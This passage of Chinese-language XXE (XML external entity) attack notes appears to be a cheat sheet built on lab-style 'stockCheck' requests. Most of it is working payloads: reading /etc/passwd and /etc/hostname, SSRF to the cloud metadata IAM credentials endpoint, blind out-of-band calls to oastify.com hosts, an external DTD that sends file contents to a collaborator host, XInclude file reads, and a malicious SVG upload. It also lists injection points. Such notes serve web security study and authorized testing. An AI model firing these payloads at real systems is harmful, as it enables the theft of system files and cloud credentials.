   1. 内嵌外解，docbookx.dtd中引用了%ISOamso;
   ```

2. 外部dtd解析权限更高，条件更加宽松，这才是XXE选择外部dtd的主要原因！

##### 引用外部dtd方式：

1. 直接doc引用

   ```
   <!DOCTYPE note SYSTEM "note.dtd">
   ```

2. 外部实体引用

   ```
   <!DOCTYPE doc [
     <!ENTITY % ext SYSTEM "external.dtd">
     %ext;
   ]>
   ```

## 场景POC：

##### 1、普通参数外部实体，读取敏感文件

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

##### 2、普通参数外部实体，回显SSRF

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

##### 3、普通参数外部实体，无回显SSRF：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://szvf6640kwamspb20mzo50apngt8hy5n.oastify.com/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

##### 4、实体参数外部实体，无回显SSRF：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://8nw9bwmptk84otxllaxw5wpia9g04rsg.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

##### 5、内部dtd：实体参数外部实体引用外部dtd、外部dtd：实体参数外部实体嵌套实体参数外部实体

外部dtd:

1. 无回显读取敏感文件

   ```
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
   %eval;
   %exfil;
   ```

2. 回显读取敏感文件

   ```
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
   %eval;
   %exfil;
   ```

内部dtd:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

##### 6、XInclude，插入xml主体，回显敏感文件

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 注入点：

##### 明确post是xml：

1. 插入dtd
2. 插入xml主体

##### 没有明确是xml：

1. 可以尝试插入xml主体

##### 上传svg/xml文件点：

例：

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```



